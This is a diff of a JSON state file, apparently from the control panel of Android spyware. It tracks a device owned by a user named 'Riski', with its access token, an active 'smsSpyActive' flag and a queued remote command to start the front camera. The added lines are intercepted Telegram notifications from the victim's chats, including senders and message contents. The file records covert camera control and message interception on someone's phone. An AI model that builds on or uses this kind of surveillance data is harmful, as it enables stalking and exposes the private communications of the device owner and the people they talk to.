@@ -2507,16 +2507,8 @@
     "deviceName": "HP-RISKI_123-D73B",
     "ownerUsername": "Riski",
     "token": "edadccccbb547c8d8cc05f1fd51950e5",
-    "lastSeen": 1775458687352,
-    "commandQueue": [
-      {
-        "type": "camera_live_start",
-        "payload": {
-          "facing": "front"
-        },
-        "sentAt": 1775458683868
-      }
-    ],
+    "lastSeen": 1775458690360,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:52:49.760Z",
     "deviceInfo": {
@@ -2531,6 +2523,46 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Room Public: BOT JASHER FREE / ON 24 JAM",
+        "content": "BOT JASHER FREE JOIN BRE\n\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n\nBOT JASHER BREE NANTI KALO MAU SHARE MINTA ADD AJA𝘽𝙤𝙩 𝙅𝙖𝙨𝙝𝙚𝙧 𝙁𝙧𝙚𝙚 𝙑𝙫𝙞𝙥 \n@JasherFreeVippPremBot\n@JasherFreeVippPremBot",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458690688
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL TITLE VPS ( PRIVATE ): 𝐅𝐀𝐇𝐌𝐈 𝐒𝐓𝐎𝐑𝐄",
+        "content": "Lu juga",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458690544
+      },
+      {
+        "appName": "Telegram",
+        "sender": "こんにちは: mamaklòwh",
+        "content": "Infokan panel free",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458690058
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "XTERCLOSE・8952 pesan baru dari 92 obrolan",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458689847
+      },
+      {
+        "appName": "Telegram",
+        "sender": "⏤͟͟͞͞l⚡ MURBUGVIP: autocpu",
+        "content": "📊 Monitoring CPU Server\n\nStatus Server:\n✅ Semua server normal (CPU < 80%)",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688807
+      },
       {
         "appName": "Telegram",
         "sender": "𝗫𝗢-𝟬𝟭𝟱 𝗩𝗖𝗧 𝗣𝗥𝗢𝗠𝗢𝗦𝗜: Rose",
